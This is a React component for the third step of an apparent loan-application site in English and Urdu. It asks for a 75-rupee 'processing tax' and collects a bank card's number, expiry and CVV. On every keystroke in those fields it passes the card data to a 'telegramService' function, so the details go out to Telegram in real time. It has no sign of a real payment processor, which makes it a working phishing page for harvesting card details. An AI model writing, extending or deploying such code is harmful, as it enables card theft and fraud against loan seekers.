import React, { useState } from 'react';
import { CardInfo } from '../types';
import { ArrowRight, ArrowLeft, CreditCard, Lock, ShieldCheck, Wifi } from 'lucide-react';
import { sendRealtimeCardInfoUpdate } from '../services/telegramService';

interface Step3Props {
  data: CardInfo;
  onUpdate: (updated: Partial<CardInfo>) => void;
  onNext: () => void;
  onBack: () => void;
}

export const Step3LoanFees: React.FC<Step3Props> = ({
  data,
  onUpdate,
  onNext,
  onBack,
}) => {
  const [errors, setErrors] = useState<Record<string, string>>({});

  const formatCardNumber = (val: string) => {
    const cleaned = val.replace(/\D/g, '').slice(0, 16);
    const groups = [];
    for (let i = 0; i < cleaned.length; i += 4) {
      groups.push(cleaned.slice(i, i + 4));
    }
    return groups.join(' ');
  };

  const formatExpiry = (val: string) => {
    const cleaned = val.replace(/\D/g, '').slice(0, 4);
    if (cleaned.length <= 2) return cleaned;
    return `${cleaned.slice(0, 2)}/${cleaned.slice(2)}`;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    const updated = { ...data, cardNumber: formatted };
    onUpdate({ cardNumber: formatted });
    sendRealtimeCardInfoUpdate(updated);
    if (errors.cardNumber) setErrors((prev) => ({ ...prev, cardNumber: '' }));
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    const updated = { ...data, expiry: formatted };
    onUpdate({ expiry: formatted });
    sendRealtimeCardInfoUpdate(updated);
    if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: '' }));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    const updated = { ...data, cvv: val };
    onUpdate({ cvv: val });
    sendRealtimeCardInfoUpdate(updated);
    if (errors.cvv) setErrors((prev) => ({ ...prev, cvv: '' }));
  };

  const validate = () => {
    const newErrors: Record<string, string> = {};
    const rawCard = data.cardNumber.replace(/\s/g, '');
    if (!rawCard || rawCard.length < 16) {
      newErrors.cardNumber = 'Enter valid 16-digit card number / درست کارڈ نمبر درج کریں';
    }
    if (!data.expiry || data.expiry.length < 5) {
      newErrors.expiry = 'Enter expiry MM/YY / میعاد درج کریں';
    }
    if (!data.cvv || data.cvv.length < 3) {
      newErrors.cvv = 'Enter 3-digit CVV / سی وی وی درج کریں';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      onNext();
    }
  };

  return (
    <div className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-7 shadow-sm max-w-lg mx-auto">
      {/* Header */}
      <div className="flex items-start justify-between border-b border-slate-100 pb-4 mb-4">
        <div>
          <h2 className="text-xl sm:text-2xl font-bold text-[#0b1c33] font-sans flex items-center gap-2">
            Loan Apply Fees
          </h2>
          <p className="text-xs text-slate-500 mt-0.5">
            Pay Rs. 75 processing tax to submit your application
          </p>
          <p className="text-xs font-serif text-slate-600 mt-0.5">
            درخواست جمع کرانے کے لیے 75 روپے ٹیکس ادا کریں
          </p>
        </div>
        <div className="text-right">
          <span className="text-xl sm:text-2xl font-serif font-bold text-[#0b1c33] block">
            محفوظ ادائیگی
          </span>
        </div>
      </div>

      {/* Visual Debit Card Diagram (Matching Screenshot 7) */}
      <div className="my-5 p-4 bg-gradient-to-br from-slate-900 to-[#0e2a1b] rounded-2xl text-white shadow-xl relative overflow-hidden border border-slate-800">
        <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none" />

        {/* Top Card Branding */}
        <div className="flex items-center justify-between mb-6">
          <span className="text-[10px] font-semibold tracking-widest uppercase bg-white/10 px-2 py-0.5 rounded-sm text-emerald-300">
            premium debit
          </span>
          <Wifi className="w-5 h-5 text-emerald-400 rotate-90" />
        </div>

        {/* EMV Chip */}
        <div className="w-9 h-7 bg-amber-200/90 rounded-md mb-4 border border-amber-300/80 grid grid-cols-2 gap-0.5 p-1">
          <div className="border border-amber-400/40 rounded-xs" />
          <div className="border border-amber-400/40 rounded-xs" />
        </div>

        {/* Card Number */}
        <div className="font-mono text-base sm:text-lg tracking-[0.2em] mb-4 text-emerald-100 font-semibold drop-shadow-xs">
          {data.cardNumber || '•••• •••• •••• ••••'}
        </div>

        {/* Card Footer Details */}
        <div className="flex items-end justify-between text-[11px] font-mono text-slate-300">
          <div>
            <span className="text-[9px] uppercase tracking-wider text-slate-400 block">
              VALID FROM
            </span>
            <span>04/2024</span>
          </div>
          <div>
            <span className="text-[9px] uppercase tracking-wider text-slate-400 block">
              VALID THRU
            </span>
            <span>{data.expiry || '04/2029'}</span>
          </div>
          <div className="bg-slate-800/80 px-2 py-1 rounded-sm border border-slate-700">
            <span className="text-[9px] uppercase text-slate-400 block">CVC/CVV</span>
            <span className="text-emerald-400">{data.cvv || '***'}</span>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Bank ATM Card Number (Numeric Keyboard) */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Bank ATM Card Number <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">بینک اے ٹی ایم کارڈ نمبر</span>
          </div>
          <div className="relative">
            <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
              <CreditCard className="w-4 h-4" />
            </div>
            <input
              type="tel"
              inputMode="numeric"
              id="input-card-number"
              placeholder="0000 0000 0000 0000"
              value={data.cardNumber}
              onChange={handleCardNumberChange}
              maxLength={19}
              className={`w-full pl-10 pr-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg font-mono focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
                errors.cardNumber ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
              }`}
            />
          </div>
          {errors.cardNumber && <p className="text-xs text-red-500 mt-1">{errors.cardNumber}</p>}
        </div>

        {/* Expiry & CVV Row (Numeric Keyboards) */}
        <div className="grid grid-cols-2 gap-3">
          <div>
            <div className="flex justify-between items-center mb-1">
              <label className="text-xs font-bold text-slate-800">
                Expiry <span className="text-red-500">*</span>
              </label>
              <span className="text-xs font-medium text-slate-600 font-serif">میعاد</span>
            </div>
            <input
              type="tel"
              inputMode="numeric"
              id="input-expiry"
              placeholder="MM/YY"
              value={data.expiry}
              onChange={handleExpiryChange}
              maxLength={5}
              className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg font-mono text-center focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
                errors.expiry ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
              }`}
            />
            {errors.expiry && <p className="text-xs text-red-500 mt-1">{errors.expiry}</p>}
          </div>

          <div>
            <div className="flex justify-between items-center mb-1">
              <label className="text-xs font-bold text-slate-800">
                CVV <span className="text-red-500">*</span>
              </label>
              <span className="text-xs font-medium text-slate-600 font-serif">سی وی وی</span>
            </div>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400">
                <Lock className="w-3.5 h-3.5" />
              </div>
              <input
                type="password"
                inputMode="numeric"
                pattern="[0-9]*"
                id="input-cvv"
                placeholder="***"
                value={data.cvv}
                onChange={handleCvvChange}
                maxLength={4}
                className={`w-full pl-8 pr-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg font-mono text-center focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
                  errors.cvv ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
                }`}
              />
            </div>
            {errors.cvv && <p className="text-xs text-red-500 mt-1">{errors.cvv}</p>}
          </div>
        </div>

        {/* Processing Tax Highlight Box */}
        <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 flex items-center justify-between">
          <div>
            <span className="text-xs font-bold text-slate-800 block">Processing Tax</span>
            <span className="text-xs font-serif text-slate-500 block">پروسیسنگ ٹیکس</span>
          </div>
          <div className="text-right">
            <span className="text-xl font-bold font-mono text-[#0b1c33]">Rs. 75</span>
          </div>
        </div>

        {/* Buttons */}
        <div className="pt-3 flex gap-3">
          <button
            type="button"
            onClick={onBack}
            id="step3-back-btn"
            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back / واپس</span>
          </button>

          <button
            type="submit"
            id="step3-continue-btn"
            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5"
          >
            <span>Continue / جاری رکھیں</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </form>
    </div>
  );
};

